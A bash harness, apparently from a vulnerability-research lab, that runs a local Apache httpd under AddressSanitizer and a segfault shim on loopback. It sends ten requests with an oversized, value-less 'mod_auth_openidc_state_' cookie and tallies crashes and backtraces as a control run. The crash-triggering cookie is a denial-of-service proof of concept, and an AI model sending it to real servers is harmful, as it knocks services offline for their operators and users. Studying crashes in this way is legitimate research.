#!/usr/bin/env bash
# Fixed-tag control for the SIGSEGV-backtrace shim: same preload, same long
# value-less token. Loopback 127.0.0.1:18090 only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain-fixed.conf"
ERR="$HERE/error-plain-fixed.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1 || true; sleep 1; }
trap stop EXIT
stop
: >"$ERR"
LD_PRELOAD="/usr/lib/x86_64-linux-gnu/libasan.so.8:$OUT/catchsegv.so" \
  "$HTTPD" -f "$CONF" -k start >"$OUT/fixed-sigsegv-start.out" 2>&1
sleep 2
PAD=$(printf 'a%.0s' $(seq 1 7800))
: >"$OUT/fixed-sigsegv-codes.txt"
for i in $(seq 1 10); do
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD" "$URL" 2>/dev/null || echo CURLERR)
  echo "$i $code" >>"$OUT/fixed-sigsegv-codes.txt"
done
cp "$ERR" "$OUT/fixed-sigsegv-error.log"
printf 'fixed_shim_trials=%s empty=%s backtraces=%s\n' \
  "$(wc -l <"$OUT/fixed-sigsegv-codes.txt")" \
  "$(grep -c '000\|CURLERR' "$OUT/fixed-sigsegv-codes.txt" || true)" \
  "$(grep -c SEGVHANDLER "$OUT/fixed-sigsegv-error.log" || true)" >"$OUT/fixed-sigsegv-summary.txt"
cat "$OUT/fixed-sigsegv-summary.txt"
